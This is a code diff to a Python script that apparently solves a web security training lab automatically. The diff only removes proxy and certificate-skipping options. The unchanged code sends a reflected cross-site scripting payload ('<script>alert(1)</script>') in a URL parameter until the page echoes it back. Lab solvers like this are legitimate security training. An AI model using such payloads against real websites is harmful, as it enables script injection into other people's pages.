@@ -12,15 +12,15 @@ class LabSolver:
         params = {
             'hacker': '\'/><script>alert(1)</script>',
         }
-        response = self.session.get(self.lab_url, params=params, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+        response = self.session.get(self.lab_url, params=params)
         while True:
             if '<script>alert(1)</script>' not in response.text:
-                response = self.session.get(self.lab_url, params=params, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+                response = self.session.get(self.lab_url, params=params)
             else:
                 break
 
     def check_solution(self):
-        response = self.session.get(self.lab_url, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+        response = self.session.get(self.lab_url)
         if 'Congratulations, you solved the lab!' in response.text:
             print('You solved the lab.')
             print('Coded by Mohamed Ahmed (ma4747gh).')
